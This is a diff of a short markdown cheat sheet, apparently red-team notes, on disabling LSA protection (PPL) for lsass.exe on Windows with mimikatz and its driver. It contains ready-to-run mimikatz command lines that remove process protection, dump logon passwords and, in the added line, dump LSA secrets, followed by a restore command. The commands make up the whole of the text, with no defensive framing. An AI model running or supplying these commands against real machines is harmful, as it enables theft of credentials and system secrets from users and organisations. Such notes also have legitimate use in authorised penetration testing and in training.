@@ -10,5 +10,6 @@ CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v Run
 
 ### Disable PPL using mimikatz
 - Transfer both `mimikatz.exe` and `mimidrv.sys` to the same directory, e.g `C:\Windows\Tasks`.
-- Run: `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "sekurlsa::logonpasswords" "exit"`
+- Dump logonpasswords: `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "sekurlsa::logonpasswords" "exit"`
+- Dump secrets: `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "lsadump::secrets" "exit"`
 - Restore: `.\mimikatz.exe "!processprotect /process:lsass.exe" "!-" "exit"`
